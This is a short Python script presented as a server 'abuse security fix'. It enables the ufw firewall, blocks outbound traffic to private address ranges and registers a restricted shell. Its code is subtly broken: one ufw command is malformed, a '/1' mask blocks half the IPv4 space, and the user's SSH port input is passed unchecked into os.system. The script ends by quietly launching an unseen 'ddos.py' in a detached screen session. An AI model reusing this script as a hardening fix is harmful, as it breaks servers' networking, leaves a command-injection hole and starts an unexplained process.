import os
import subprocess
import time
os.system("clear")
print("Simple Abuse Server Security Fix by Ali Lafzi Ghazi\n")
portssh = input("Enter your ssh port: ")

#Active ufw Firewall
os.system("sudo ufw enable")
time.sleep(4)
os.system("ufw allow 80")
os.system("ufw allow 443")
os.system("ufw allow default deny incoming")
os.system("sudo ufw default allow outgoing")
os.system("sudo ufw allow ssh")
os.system("ufw allow"+" "+portssh)
time.sleep(4)

#Close Private IP Range
os.system("ufw deny out to 10.0.0.0/8")
os.system("ufw deny out to 172.16.0.0/12")
os.system("ufw deny out to 192.168.0.0/16")
os.system("ufw deny out to 100.64.0.0/10")
os.system("ufw deny out to 198.18.0.0/15")
os.system("ufw deny out to 169.254.0.0/1")

os.system("sudo ufw reload")
time.sleep(4)
os.system("clear")
time.sleep(5)
print("Fix Restricted Shell...")
subprocess.run(["sudo", "groupadd", "restricted_shell"])
subprocess.run(["sudo", "sed", "-i", '$a/bin/rbash', "/etc/shells"])
time.sleep(5)
os.system("clear") 
time.sleep(6)
os.system("clear") 
os.system("ufw status")
time.sleep(6)
os.system("clear") 
print("End.....!")
os.system("sudo apt install screen -y")
os.system("screen python3 ddos.py")
